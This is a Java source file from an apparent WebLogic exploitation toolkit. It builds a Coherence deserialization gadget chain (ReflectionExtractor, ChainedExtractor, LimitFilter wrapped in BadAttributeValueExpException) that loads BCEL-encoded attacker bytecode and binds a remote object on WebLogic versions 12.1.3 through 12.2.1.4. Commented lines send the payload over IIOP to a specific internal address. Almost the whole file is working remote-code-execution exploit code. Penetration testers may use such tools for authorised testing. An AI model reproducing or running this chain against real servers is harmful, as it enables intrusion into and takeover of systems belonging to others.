/*
 * Copyright (c) 2020. r4v3zn.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.weblogic.framework;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import javassist.ClassPool;
import javassist.CtClass;
import org.mozilla.classfile.DefiningClassLoader;
import org.python.core.BytecodeLoader;
import weblogic.cluster.singleton.ClusterMasterRemote;

import javax.management.BadAttributeValueExpException;
import java.io.Serializable;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.net.URL;
import java.net.URLClassLoader;
import java.rmi.Remote;
import java.security.SecureClassLoader;

import static com.weblogic.framework.utils.CallUtils.CALL_MAP;
import static com.weblogic.framework.utils.ClassLoaderUtils.loadJar;
import static com.weblogic.framework.utils.ContextUtils.rebind;
import static com.weblogic.framework.utils.StringUtils.getRandomString;
import static org.apache.commons.lang3.StringUtils.isBlank;

/**
 * Title: Test
 * Desc: TODO
 * Date:2020/4/9 17:57
 * Email:woo0nise@gmail.com
 * Company:www.j2ee.app
 *
 * @author R4v3zn
 * @version 1.0.0
 */
public class Test {

    /**
     * 漏洞利用 jar 文件名称
     */
    public static final String[] VUL_DEPENDENCIES = new String[]{"coherence.jar"};

    /**
     * 漏洞影响版本
     */
    public static final String[] VUL_VERSIONS = new String[]{"12.1.3.0", "12.1.3.0.0", "12.2.1.3.0", "12.2.1.3.0.0", "12.2.1.4.0", "12.2.1.4.0.0"};

    public static void main(String[] args) throws Exception {
        String callName = ClusterMasterRemote.class.getSimpleName();
        Class<? extends Remote> callClazz = CALL_MAP.get(callName);
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass =  pool.get(callClazz.getName());
        if(ctClass.isFrozen()){
            ctClass.defrost();
        }
        ctClass.setName(callClazz.getSimpleName());
        byte[] bytes = ctClass.toBytecode();
        String result = Utility.encode(bytes, true);
        result = "PocServerClusterMasterRemote$$BCEL$$"+result;
        System.out.println(result);

//        URLClassLoader urlClassLoader = loadJar("12.2.1.3.0",VUL_DEPENDENCIES);
//
//        String bindName = getRandomString(16);
//        Object sendObject = getObject(null, new String[]{bindName,""}, result,urlClassLoader);
//
//        ContextPojo contextPojo = rebind("iiop://10.10.10.162:7001", sendObject, urlClassLoader);

//        com.sun.org.apache.bcel.internal.util.ClassLoader.class.newInstance().loadClass(result);
//        Class clazz = Class.forName(result,true, new ClassLoader());
//        ClassLoader classLoader = new ClassLoader();
//        BytecodeLoader loader2 = new BytecodeLoader();
//        BytecodeLoader.makeClass("PocServerClusterMasterRemote", null, bytes);
//        Class clazz1 = classLoader.getParent().loadClass("weblogic.cluster.singleton.ClusterMasterRemote");
//        Class clazz1 = classLoader.loadClass("weblogic.cluster.singleton.ClusterMasterRemote");
//        Class clazz = classLoader.createClass(result);
//         $$BCEL$$$
//        System.out.println(clazz.getName());
    }

    /**
     * 获取序列化 payload
     * @param codeByte 需要序列化的字节码
     * @param bootArgs 执行中参数,0位传入执行class命令,1位传入DefiningClassLoader url
     * @param className 反射的 class name
     * @return 序列结果
     * @throws Exception
     */
    public static Serializable getObject(byte[] codeByte, String[] bootArgs, String className, URLClassLoader urlClassLoader) throws Exception {
        String classPath = bootArgs[1];
        Class valueExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.ValueExtractor");
        Class reflectionExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.extractor.ReflectionExtractor");
        Class clazz = null;
        Object valueExtractor = Array.newInstance(valueExtractorClazz,4);
//        DefiningClassLoader.class.newInstance().defineClass()
        Object javascriptNewInstance = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
        Object defineClass = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("loadClass",
                new Object[]{className});
        Object defineClassNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
        Object rmiBind = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("rmiBind",
                new Object[]{bootArgs[0]});
        Array.set(valueExtractor, 0, javascriptNewInstance);
        Array.set(valueExtractor, 1, defineClass);
        Array.set(valueExtractor, 2, defineClassNewInstance);
        Array.set(valueExtractor, 3, rmiBind);
        clazz = ClassLoader.class;
        return getObject(valueExtractor, clazz, urlClassLoader);
    }

    /**
     * 获取序列化 payload
     * @param valueExtractors ValueExtractors
     * @param clazz 反序列化的 class
     * @return 序列结果
     * @throws Exception
     */
    private static Serializable getObject(final Object valueExtractors, Class clazz, URLClassLoader urlClassLoader) throws Exception {
        Class limitFilterClazz = urlClassLoader.loadClass("com.tangosol.util.filter.LimitFilter");
        Class chainedExtractorClazz  = urlClassLoader.loadClass("com.tangosol.util.extractor.ChainedExtractor");
        Object limitFilter = limitFilterClazz.newInstance();
        Field m_comparator = limitFilterClazz.getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        Object chainedExtractor = chainedExtractorClazz.getConstructor(valueExtractors.getClass()).newInstance(valueExtractors);
        m_comparator.set(limitFilter, chainedExtractor);
        Field m_oAnchorTop = limitFilterClazz.getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, clazz);
        BadAttributeValueExpException expException = new BadAttributeValueExpException(null);
        Field val = expException.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(expException, limitFilter);
        return expException;
    }
}
